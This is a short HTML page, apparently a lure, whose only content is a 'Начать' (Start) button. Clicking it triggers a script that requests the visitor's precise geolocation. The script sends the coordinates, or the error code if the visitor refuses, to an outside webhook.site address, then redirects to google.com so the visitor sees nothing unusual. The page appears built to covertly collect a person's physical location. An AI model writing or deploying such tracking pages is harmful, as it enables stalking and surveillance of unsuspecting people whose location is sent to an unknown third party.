<!DOCTYPE html>
<html>
<body>
    <button id="start" style="padding:20px; font-size:20px;">Начать</button>
    <script>
        const webhookUrl = "https://webhook.site/5c07e1e0-118c-480d-b310-b99e02767545";

        document.getElementById('start').onclick = () => {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const data = {lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy};
                    // Используем URLSearchParams для правильной отправки параметров
                    const params = new URLSearchParams(data).toString();
                    fetch(webhookUrl + '?' + params).then(() => {
                        window.location.href = "https://google.com";
                    });
                },
                (err) => {
                    fetch(webhookUrl + '?error=' + err.code).then(() => {
                        window.location.href = "https://google.com";
                    });
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        };
    </script>
</body>
</html>
